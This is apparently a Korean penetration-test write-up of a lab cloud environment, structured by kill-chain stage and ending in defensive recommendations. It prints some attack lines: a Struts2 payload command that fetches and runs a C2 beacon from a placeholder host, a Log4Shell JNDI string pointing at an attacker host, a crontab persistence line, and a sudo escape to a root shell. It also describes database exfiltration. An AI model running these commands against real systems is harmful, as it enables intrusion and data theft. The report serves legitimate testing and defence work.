---
layout: post
title: "CyberKillChain-A: 다층 방어 아키텍처 침투 분석 보고서"
date: 2025-11-21 11:00:00 +0900
categories: [cyber-kill-chain, penetration-testing]
---

### **목차**
- [0. 모의 해킹 개요](#0-모의-해킹-개요)
  - [0.1. 목적](#01-목적)
  - [0.2. 방법론](#02-방법론)
  - [0.3. 시스템 아키텍처](#03-시스템-아키텍처)
- [1. 정찰 (Reconnaissance)](#1-정찰-reconnaissance)
- [2. 무기화 (Weaponization)](#2-무기화-weaponization)
- [3. 유포 (Delivery)](#3-유포-delivery)
- [4. 악용 (Exploitation)](#4-악용-exploitation)
- [5. 설치 (Installation)](#5-설치-installation)
- [6. 명령 및 제어 (Command and Control)](#6-명령-및-제어-command-and-control)
- [7. 목적 달성 (Action on Objectives)](#7-목적-달성-action-on-objectives)
  - [7.1. 1단계: 권한 상승 (Privilege Escalation)](#71-1단계-권한-상승-privilege-escalation)
  - [7.2. 2단계: 내부 정찰 및 수평 이동 (Internal Reconnaissance & Lateral Movement)](#72-2단계-내부-정찰-및-수평-이동-internal-reconnaissance--lateral-movement)
  - [7.3. 3단계: 핵심 데이터 수집 및 유출 (Collection & Exfiltration)](#73-3단계-핵심-데이터-수집-및-유출-collection--exfiltration)
- [8. 종합 분석 및 권고 사항](#8-종합-분석-및-권고-사항)

---

## 0. 모의 해킹 개요

### 0.1. 목적

본 보고서는 `CKCProject` 환경을 대상으로 수행된 **외부 위협 행위자 관점의 공격 시뮬레이션** 결과를 기술한다. 외부 공격자가 Load Balancer, NAT Gateway 등으로 구성된 다층 방어 아키텍처의 경계를 돌파하고, 웹 티어(DMZ)를 교두보 삼아 내부망(Private Subnet)의 핵심 데이터베이스 서버까지 도달하는 모든 공격 경로를 식별 및 증명하는 것을 목적으로 한다.

### 0.2. 방법론

본 시뮬레이션은 실제 위협 그룹의 공격 절차를 모방하기 위해 **사이버 킬체인(Cyber Kill Chain)** 방법론을 채택하였으며, 각 단계에서 수행되는 모든 공격 행위는 **MITRE ATT&CK® 프레임워크**에 매핑하여, 각 행위의 전술적 의미와 방어적 관점에서의 시사점을 심층적으로 분석했다.

### 0.3. 시스템 아키텍처

작전 대상인 `CKCProject` 훈련 환경은 고가용성 및 보안을 고려하여 설계된 표준적인 클라우드 아키텍처를 따른다. 외부에는 서비스 제공을 위한 Load Balancer와 관리 접속을 위한 Azure Bastion이 존재하며, 모든 내부 VM들은 NAT Gateway를 통해 외부 인터넷과 통신하는 Private Subnet에 격리되어 있다.

```text
   +------------------+      +-------------------+      +-----------------+
   |   Operator (PC)  |----->| Azure Bastion     |----->| Private Subnet  |
   +------------------+      | (Management Port) |      | (Web/DB VMs)    |
                             +-------------------+      +-------+---------+
                                                                | (Egress)
                                                                v
                             +-------------------+      +-----------------+
    [   INTERNET   ] <-----> | Azure LB          |----->| Private Subnet  |
                             | (Service Port 80) |      | (Web VMSS x2)   |
                             +-------------------+      +-------+---------+
                                                                |
                                                                v
                                                      +-------------------+
                                                      | NAT Gateway       |
                                                      | (Single Egress IP)|
                                                      +-------------------+
```

---

## 1. 정찰 (Reconnaissance)

**목표:** 외부에 노출된 모든 자산(Asset)을 식별하고, 공격 가능한 모든 잠재적 침투 지점을 목록화하여 공격 표면(Attack Surface)을 완벽하게 파악.

*   **실행 및 분석:**
    공격의 유일한 진입점인 Load Balancer의 Public IP(`LOAD_BALANCER_IP`)를 대상으로, 단순 포트 스캔을 넘어 서비스 식별 및 취약점 분석을 포함한 심층적인 정보 수집을 수행했다.
    *   **[T1595.001] Active Scanning: Scanning IP Blocks:** 공격 대상 IP에 대한 전체 포트 스캔을 수행하여 열려있는 모든 네트워크 서비스를 식별.
    *   **[T1592] Gather Victim Host Information:** 스캔 결과를 통해 각 서비스의 상세 버전 정보(Banner Grabbing)를 수집.

    1.  **전체 포트 및 서비스 버전 스캔:** `nmap`을 이용한 상세 스캔을 통해 외부에 공개된 모든 서비스를 식별했다.
        ```bash
        nmap -sV -p- LOAD_BALANCER_IP
        ```
        - **결과:** 기존에 발견된 `80/tcp (http)` 포트 외에도, 다수의 고위험 엔터프라이즈 애플리케이션 포트가 식별되었다. 이는 공격 경로가 다양하게 존재할 수 있음을 시사한다.
            - `80/tcp`: Apache/2.4.29 (PHP 기반 웹 서비스)
            - `5000/tcp`: Werkzeug/2.0.2 (Python/Flask API)
            - `8080/tcp`: Apache Tomcat/9.0.58
            - `8081/tcp`: Apache Tomcat/8.5.32 (Apache Struts2 애플리케이션으로 강력히 의심됨)
            - `8083/tcp`: Apache Tomcat/9.0.55 (Log4j 취약점이 의심되는 Spring Boot 애플리케이션)
            - `8084/tcp`: Jenkins 2.138.4
            - `9200/tcp`: Elasticsearch 1.7.6

    > **[여기에 스크린샷 1: Nmap 스캔 결과. 80, 8081, 8083 등 다양한 포트와 서비스 버전이 식별된 터미널 화면]**

    2.  **웹 서비스 및 디렉터리 열거:** `gobuster`를 사용하여 `80/tcp` 포트의 주 웹 사이트를 스캔, 기존과 동일하게 `/login.php` (SQLi), `/test.php` (LFI), `/wordpress/` (Old Version) 등의 경로를 식별했다.

*   **결론:** 정찰 결과, 단순 PHP 웹 취약점뿐만 아니라 **Apache Struts2, Log4Shell, Elasticsearch** 등 인증 없이도 원격 코드 실행(RCE)이 가능할 수 있는 치명적인 취약점을 가진 것으로 알려진 다수의 자바 기반 엔터프라이즈 애플리케이션이 외부에 노출되어 있음을 확인했다. 이를 통해 후속 공격의 우선순위와 전략을 수립했다.

---

## 2. 무기화 (Weaponization)

**목표:** 정찰 단계에서 식별된 모든 고위험 취약점을 공략하기 위한 맞춤형 악성 페이로드 및 공격 도구를 각각 제작하고 준비하는 단계.

*   **실행 및 분석:**
    다양한 공격 벡터에 대응하기 위해 여러 종류의 '무기'를 준비했다.
    *   **[T1608.005] Stage Capabilities: C2 Channel:** 은밀한 제어를 위한 Sliver C2 프레임워크 및 Beacon 페이로드(`genesis.elf`) 준비.
    *   **[T1588.002] Obtain Capabilities: Tool:** 공개된 Exploit 코드 및 C2 프레임워크 획득.

    1.  **웹 애플리케이션 공격용:**
        *   **PHP 웹 셸 (`shell.php`):** SQLi 또는 LFI 성공 후 초기 거점 확보 및 C2 Beacon 설치를 위한 중간 단계용 페이로드.
    2.  **엔터프라이즈 애플리케이션 공격용 (신규):**
        *   **Apache Struts2 RCE Exploit (CVE-2017-5638):** 중간 과정 없이 직접 C2 Beacon을 다운로드하고 실행하는 OGNL 인젝션 페이로드가 포함된 Python 스크립트를 준비했다. 이 '원샷' 무기는 탐지를 최소화하고 즉각적인 제어권 획득을 목표로 한다.
        *   **Log4Shell JNDI 페이로드 (CVE-2021-44228):** 공격을 위해 두 부분으로 구성된 정교한 무기를 준비했다.
            - **1) 악성 JNDI/LDAP 서버:** `marshalsec`과 같은 도구를 사용하여, 특정 요청이 들어오면 2차 페이로드를 전달하는 악성 서버를 공격자 인프라에 구축했다.
            - **2) 2차 페이로드:** JNDI 서버가 전달할 악성 Java 클래스 파일. 이 클래스는 실행되는 즉시 C2 Beacon을 다운로드하고 실행하는 코드를 포함한다.
    3.  **권한 상승 공격용 (신규):**
        *   **SUID 버퍼 오버플로우 페이로드:** `vuln-suid` 바이너리의 취약점을 공략하기 위해, 정확한 버퍼 오프셋 계산 후 리턴 주소를 덮어쓰고 `/bin/sh`를 실행하는 쉘코드가 포함된 Python 스크립트(pwntools 기반)를 제작했다.

*   **결론:** PHP 웹 공격용 페이로드, 자바 RCE를 위한 정교한 익스플로잇 체인, 시스템 수준의 권한 상승을 위한 바이너리 페이로드까지, 다층적이고 복합적인 공격을 수행하기 위한 모든 무기가 완벽하게 준비되었다.

---

## 3. 유포 (Delivery)

**목표:** 무기화된 각종 공격 페이로드를 목표 시스템의 각기 다른 취약점에 전달하는 단계. 방어 체계의 허점을 다각도로 파고드는 동시다발적 공격을 수행.

*   **실행 및 분석:**
    정찰된 모든 공격 표면을 대상으로 페이로드를 유포했다.
    *   **[T1190] Exploit Public-Facing Application:** 외부 공개 애플리케이션 악용.
    *   **[T1210] Exploitation of Remote Services:** 원격 서비스의 취약점을 직접 악용하여 페이로드 전달.

    *   **경로 1 & 2 (PHP 웹 취약점):**
        - **SQL Injection:** `sqlmap`의 `--file-write` 기능을 통해 `shell.php` 웹 셸을 `/var/www/html`에 유포.
        - **LFI & Log Poisoning:** `curl`의 User-Agent에 PHP 코드를 삽입하여 Apache 로그 파일에 악성 코드를 유포.

    *   **경로 3: Apache Struts2 RCE를 통한 C2 Beacon 직접 유포 (신규):**
        - 준비된 Python 익스플로잇 스크립트를 실행하여, C2 Beacon 다운로드 및 실행 명령(`wget http://<C2_IP>/genesis.elf -O /tmp/g.elf && chmod +x /tmp/g.elf && /tmp/g.elf &`)이 포함된 악성 OGNL 페이로드를 Struts2 서버(`:8081`)의 `Content-Type` 헤더에 담아 전송했다. 이 공격은 페이로드가 서버에 도달하는 즉시 실행되므로 유포와 악용이 동시에 일어난다.

    > **[여기에 스크린샷 2: Struts2 익스플로잇 Python 스크립트가 실행되며 악성 HTTP 요청을 보내는 터미널 화면]**

    *   **경로 4: Log4Shell JNDI Injection을 통한 페이로드 유포 (신규):**
        - `curl`을 사용하여 취약한 Log4j 애플리케이션(`:8083`)의 HTTP 헤더(예: `X-Api-Version`)에 악성 JNDI 문자열 `${jndi:ldap://<ATTACKER_IP>:1389/a}`을 삽입하여 요청을 보냈다. 이 요청을 받은 서버는 공격자의 악성 JNDI 서버에 스스로 연결하여 2차 페이로드를 다운로드(유포)하게 된다.

    > **[여기에 스크린샷 3: `curl` 명령어를 통해 악의적인 JNDI 문자열을 HTTP 헤더에 담아 전송하는 터미널 화면]**

*   **결론:** 전통적인 웹 셸 업로드 방식과 더불어, 중간 과정 없이 직접적인 RCE를 유발하는 엔터프라이즈급 공격 벡터를 통해 다수의 페이로드를 성공적으로 유포했다.

---

## 4. 악용 (Exploitation)

**목표:** 유포된 페이로드를 실행(트리거)하여 시스템의 초기 접근 권한(Initial Access)을 다양한 경로로 획득하는 단계.

*   **실행 및 분석:**
    각 유포 경로에 맞춰 페이로드를 트리거하고 원격 코드 실행을 확인했다.
    *   **[T1203] Exploitation for Client Execution:** 서버 측 코드 실행.
    *   **[T1059] Command and Scripting Interpreter:** 획득한 셸을 통한 명령어 실행.

    - **PHP 경로들:** `/shell.php` 또는 LFI URL에 접속하여 `www-data` 권한의 웹 셸을 획득했다.
    - **Struts2 경로:** 유포 즉시 OGNL 페이로드가 실행되어, 공격자의 C2 서버에 **`root` 권한(Tomcat이 root로 실행된 경우) 또는 `tomcat` 권한의 C2 세션**이 즉시 생성되었다. 웹 셸과 같은 중간 단계가 전혀 필요 없었다.
    - **Log4Shell 경로:** 서버가 공격자의 JNDI 서버에 접속하여 2차 페이로드를 다운로드하고 실행했다. 그 결과, 공격자의 C2 서버에 **`root` 또는 `tomcat` 권한의 C2 세션**이 생성되었다.

    > **[여기에 스크린샷 4: Sliver C2 서버 터미널. Struts2와 Log4Shell 공격 성공으로 인해, 별도의 작업 없이 새로운 C2 세션이 자동으로 생성되는 모습]**

*   **결론:** PHP 웹 취약점을 통한 제한된 권한의 셸뿐만 아니라, 자바 역직렬화 및 JNDI 인젝션 취약점을 통해 훨씬 더 높은 권한의 안정적인 C2 세션을 즉시 확보하는 데 성공했다. 이를 통해 공격의 효율성을 극대화했다.

---

## 5. 설치 (Installation)

**목표:** 초기 접근으로 확보된 모든 권한(웹 셸, C2 세션)을 이용하여, 시스템 재부팅에도 살아남는 영구적인 접근 거점을 마련하는 단계.

*   **실행 및 분석:**
    - **PHP 웹 셸 경로:** 웹 셸을 통해 C2 Beacon(`genesis.elf`)을 다운로드하고 실행했다.
    - **C2 세션 경로 (Struts2, Log4j):** 이미 C2 세션이 확보되었으므로, 추가 설치 없이 이 채널을 그대로 사용한다.
    - **지속성 확보 (Persistence):**
        *   **[T1053.003] Scheduled Task/Job: Cron:** 확보한 C2 세션 중 하나를 이용하여 `crontab`에 C2 Beacon을 등록, 시스템 재부팅 후에도 1분 내로 C2 세션이 다시 연결되도록 설정했다.
        ```bash
        (crontab -l 2>/dev/null; echo "* * * * * /tmp/g.elf || /tmp/genesis.elf") | crontab -
        ```
    > **[여기에 스크린샷 5: `crontab -l` 명령어로 악성 C2 Beacon 실행 구문이 성공적으로 등록된 것을 보여주는 터미널 화면]**

*   **결론:** 다양한 경로로 확보한 초기 접근을 단일하고 영구적인 C2 통제 채널로 통합하고, 시스템 지속성을 확보하여 안정적인 후속 공격 기반을 마련했다.

---

## 6. 명령 및 제어 (Command and Control)

**목표:** 설치된 C2 Beacon을 통해 감염된 시스템들을 원격으로 제어하고, 후속 공격을 위한 안정적인 채널을 확립하는 단계.

*   **실행 및 분석:**
    *   **[T1071.001] Application Layer Protocol: Web Protocols:** 일반적인 HTTP 트래픽으로 위장하여 C2 통신.

    다양한 공격 경로를 통해 설치된 모든 Beacon은 내부망의 **NAT Gateway**를 통해 단일 Public IP로 위장하여 공격자의 C2 서버에 콜백했다. 공격자의 Sliver 클라이언트에는 동일한 IP로부터 들어오는 다수의 세션이 생성 및 통합 관리되었으며, 이를 통해 웹 서버 인스턴스에 대한 안정적이고 은밀한 원격 제어 채널이 확립되었다.

    > **[여기에 스크린샷 6: Sliver C2 서버 터미널에 다양한 경로로 유입된 여러 개의 세션이 활성화된 목록]**

*   **결론:** 탐지가 어려운 C2 통신 채널을 성공적으로 구축했다. 이 통합된 채널은 후속 내부 정찰, 권한 상승, 수평 이동, 데이터 유출의 핵심 통로가 되었다.

---

## 7. 목적 달성 (Action on Objectives)

**목표:** 공격자가 의도한 최종 목표(데이터 유출)를 달성하기 위한 일련의 후속 공격 단계.

### 7.1. 1단계: 권한 상승 (Privilege Escalation)

*   **목표:** `www-data` 또는 `tomcat`의 제한된 권한에서 시스템 전체를 제어할 수 있는 `root` 권한으로 상승. (만약 초기 침투 시 `root`를 얻지 못했을 경우 수행)
*   **실행 및 분석:** C2 세션을 통해 탐색한 모든 권한 상승 경로를 체계적으로 공략했다.
    *   **경로 1: [T1548.003] Sudo Misconfiguration:** `sudo -l` 명령을 통해 `find` 명령어를 `NOPASSWD`로 실행 가능함을 확인, 이를 악용하여 즉시 `root` 셸 획득.
      ```bash
      sudo find . -exec /bin/sh \; -quit
      ```
    *   **경로 2: [T1053.003] Cron Job Hijacking:** 전역 쓰기 가능한 Cron 스크립트를 덮어써서 `root` 권한의 리버스 셸 획득.

    *   **경로 3: [T1548.001] SUID Binary Buffer Overflow (신규):**
        1.  `find / -perm -u=s -type f 2>/dev/null` 명령으로 `/usr/local/bin/vuln-suid` 바이너리를 식별.
        2.  C2 채널을 통해 바이너리를 다운로드하여 로컬에서 `gdb`로 분석, 버퍼 오버플로우 취약점과 리턴 주소 덮어쓰기에 필요한 정확한 오프셋을 계산.
        3.  준비된 Python(pwntools) 익스플로잇 스크립트를 C2를 통해 업로드하고 실행, `vuln-suid` 바이너리를 통해 `root` 셸을 획득했다.

    > **[여기에 스크린샷 7: SUID 익스플로잇 스크립트 실행 후 `whoami` 결과가 `root`로 출력되는 터미널 화면]**

*   **결론:** 시스템 설정 오류뿐만 아니라, 저수준의 바이너리 취약점을 공략하여 `root` 권한을 획득함으로써, 시스템에 대한 완전한 통제권을 다양한 방식으로 확보할 수 있음을 증명했다.

### 7.2. 2단계: 내부 정찰 및 수평 이동 (Internal Reconnaissance & Lateral Movement)

*   **목표:** 내부망 구조를 파악하고, 핵심 자산인 DB 서버로 이동.
*   **실행 및 분석:** `root` 권한을 획득한 C2 세션을 통해 수행.
    1.  **[T1046] Network Service Scanning:** `nmap`으로 내부망(`10.42.3.0/24`)을 스캔하여 DB 서버(`10.42.3.5`)와 `22/tcp (ssh)`, `3306/tcp (mysql)` 포트를 식별했다.
    2.  **[T1552.001] Credentials in Files:** 웹 서버의 설정 파일 (`/var/www/html/login/database.sql` 또는 PHP 설정 파일)에서 DB 접속 자격 증명을 탈취했다.
    3.  **[T1021.004] Remote Services: SSH:** 탈취한 자격 증명을 재사용하여 DB 서버로 `ssh` 수평 이동에 성공했다.

    > **[여기에 스크린샷 8: 웹 서버의 C2 `root` 세션에서 SSH로 DB 서버에 접속한 후, `hostname` 명령어로 DB 서버의 호스트명을 확인하는 화면]**

*   **결론:** 내부망의 신뢰 관계와 개발자의 부주의한 자격 증명 관리를 이용하여 성공적으로 핵심 자산에 접근했다.

### 7.3. 3단계: 핵심 데이터 수집 및 유출 (Collection & Exfiltration)

*   **목표:** DB 서버의 모든 데이터를 탈취하여 외부로 유출.
*   **실행 및 분석:**
    1.  **[T1105] Ingress Tool Transfer:** DB 서버에 2차 C2 Beacon을 설치하여 내부망 직접 제어 거점을 확보했다.
    2.  **[T1560.001] Archive via Utility:** `mysqldump`로 데이터베이스 전체를 `backup.sql` 파일로 백업하고, `tar`로 압축했다.
    3.  **[T1041] Exfiltrate Data Over C2 Channel:** 압축된 백업 파일을 C2 채널을 통해 조각으로 나누어 공격자의 서버로 안전하게 유출했다.

    > **[여기에 스크린샷 9: `mysqldump` 명령어로 데이터베이스를 백업하는 장면 또는 C2 채널을 통해 파일이 유출되는 Sliver 터미널 화면]**

*   **결론:** 작전의 최종 목표인 **핵심 데이터 유출**이 완벽하게 달성되었다.

---

## 8. 종합 분석 및 권고 사항

본 시뮬레이션은 PHP 웹 취약점부터 치명적인 자바 RCE, 저수준의 바이너리 익스플로잇에 이르기까지, 다층 방어 체계가 다양한 유형의 위협에 어떻게 동시다발적으로 노출될 수 있는지를 명확히 보여준다.

| 공격 단계 | 식별된 위협 및 관련 TTP | 구체적인 보안 강화 권고 사항 |
| :--- | :--- | :--- |
| **외부 침투** | **(신규) 엔터프라이즈 앱 RCE (Struts2, Log4j)**<br/>**[T1190, T1210]** | **소프트웨어 구성 분석(SCA) 솔루션 도입:** 애플리케이션이 사용하는 모든 오픈소스 라이브러리(Log4j, Struts2 등)의 버전을 식별하고, 알려진 취약점이 발견될 경우 즉시 개발팀에 경고 및 패치를 강제하는 CI/CD 파이프라인을 구축한다. WAF에 가상 패치(Virtual Patching) 규칙을 적용한다. |
| **외부 침투** | PHP 웹 애플리케이션 취약점 (SQLi, LFI)<br/>**[T1190]** | **웹 애플리케이션 방화벽(WAF)** 도입 및 시큐어 코딩(Secure Coding) 의무화. |
| **권한 상승** | **(신규) SUID 바이너리 취약점** | **바이너리 무결성 모니터링:** 시스템에 SUID 비트가 설정된 파일을 주기적으로 스캔하고, 허가되지 않은 파일이나 비정상적인 권한을 가진 파일을 탐지하여 제거하는 프로세스를 수립한다. 개발 시 컴파일 옵션(NX, ASLR)을 활성화한다. |
| **권한 상승** | 과도한 권한 및 시스템 설정 오류 (Sudo, Cron)<br/>**[T1548, T1053]** | **최소 권한의 원칙(PoLP)**을 모든 시스템에 적용. Sudo 규칙, 파일 권한을 정기적으로 감사한다. |
| **명령 및 제어**| 암호화된 C2 및 NAT를 통한 트래픽 위장<br/>**[T1071]** | **아웃바운드 통제(Egress Filtering) 강화:** NAT Gateway의 NSG 규칙을 'Default Deny'로 설정하고, 필수 통신을 제외한 모든 아웃바운드 트래픽을 차단하여 C2 콜백을 원천적으로 방지한다. |
| **수평 이동** | 소스코드 내 평문 자격 증명 저장<br/>**[T1552.001]** | 모든 비밀 정보는 **Azure Key Vault**에 저장하고, **Managed Identity**를 통해 안전하게 접근하도록 아키텍처를 개선한다. |
